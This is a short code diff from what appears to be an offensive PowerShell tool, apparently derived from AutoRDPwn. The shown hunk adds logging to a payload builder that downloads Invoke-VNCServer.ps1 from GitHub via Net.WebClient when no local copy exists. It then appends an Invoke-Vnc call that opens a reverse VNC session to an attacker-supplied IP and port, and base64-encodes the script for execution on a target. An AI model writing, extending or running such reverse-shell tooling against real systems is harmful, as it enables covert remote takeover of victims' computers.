@@ -57,7 +57,8 @@ public class WTS {
 
         $vncps = Get-Content (Join-Path $PSScriptRoot 'Invoke-VNCServer.ps1') -Raw -ErrorAction SilentlyContinue
         if (!$vncps) { $vncps = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1') }
-        $vncps += "`r`ntry { Invoke-Vnc -ConType reverse -IpAddress $AttackerIP -Port $Port -Password $Password 2>&1 | Out-File 'C:\Windows\Temp\vnclog.txt' -Encoding utf8 } catch { `$_ | Out-File 'C:\Windows\Temp\vnclog.txt' -Encoding utf8 -Append }`r`n"
+        $vncps = "function L2 { Param(`$m) Add-Content -Path 'C:\Windows\Temp\vnclog.txt' -Value `$m }`r`nL2 'VNC SCRIPT STARTING'`r`n" + $vncps
+        $vncps += "`r`nL2 'INVOKING REVERSE VNC'`r`ntry { Invoke-Vnc -ConType reverse -IpAddress $AttackerIP -Port $Port -Password $Password; L2 'VNC RETURNED CLEAN' } catch { L2 ('VNC ERR: ' + `$_.Exception.Message) }`r`n"
         $vb64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($vncps))
 
         $engine = "function L { Param(`$m) Add-Content -Path 'C:\Windows\Temp\sslog.txt' -Value `$m }`n" +
